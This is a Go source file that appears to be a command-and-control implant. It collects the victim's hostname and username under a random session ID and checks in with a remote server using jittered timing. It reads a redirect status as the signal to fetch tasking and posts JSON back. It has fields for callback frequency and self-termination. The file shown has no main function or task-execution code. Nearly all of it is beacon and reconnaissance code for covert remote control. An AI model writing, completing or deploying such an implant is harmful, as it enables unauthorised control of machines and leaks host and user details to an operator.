package main
import (
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	mathrand "math/rand"
	"net/http"
	"os"
	"io"
	"os/user"
	"time"

	"bytes"
	"encoding/json"

)

var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano())) 

type CallbackInfo struct {
	Callback_freq int
	Jitter        int
	SelfTerminate int
}

type InitialInfo struct {
	Session      string `json:"session"`
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	Callback_freq int    `json:"callback_freq"`
	Jitter       int    `json:"jitter"`
}


func GatherInfo() InitialInfo {
	bytes := make([]byte, 4)
	_, err := crand.Read(bytes)  
	if err != nil {
		panic(err)
	}
	hexString := hex.EncodeToString(bytes)
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	hostInfo := InitialInfo{
		Session:      hexString,
		Hostname:     hostname,
		Username:     currentUser.Username,
		Callback_freq: 1,
		Jitter:       15,
	}
	return hostInfo
}


func FetchTasking(serverAddr string, session string) (string, error) {
        url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)

        resp, err := http.Get(url)
        if err != nil {
                return "", err
        }
        defer resp.Body.Close()
        bodyBytes, err := io.ReadAll(resp.Body)
        if err != nil {
                return "", err
        }
        bodyString := string(bodyBytes)
        fmt.Println(bodyString)
        return bodyString, nil
}

func CheckIn(serverAddr string, session string) (int, error) {
	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
        // Prevent auto redirects so if there is tasking 301 is actually returned and 
        // we can fetch tasking, otherwise the main function will just return 200
        // and we will never get the tasking
        client := &http.Client{
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                        return http.ErrUseLastResponse
                },
        }

	resp, err := client.Get(url)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
        fmt.Println("Check-in response:", resp.StatusCode)
	return resp.StatusCode, nil
}


func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
	randomPercent := rng.Intn(jitterPercent + 1)
	jitterFraction := float64(randomPercent) / 100.0

	baseSeconds := baseMinutes * 60
	jitterSeconds := int(float64(baseSeconds) * jitterFraction)

	totalSeconds := baseSeconds + jitterSeconds

	jitterDuration := time.Duration(totalSeconds) * time.Second

	fmt.Printf("Random jitter: %d%% (+%ds) → total %s\n", randomPercent, jitterSeconds, jitterDuration)
	return jitterDuration
}


func PostJson(url string, payload interface{}) (int, error) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

        body, _ := io.ReadAll(resp.Body)
        fmt.Println("Response body:", string(body))

	return resp.StatusCode, nil
}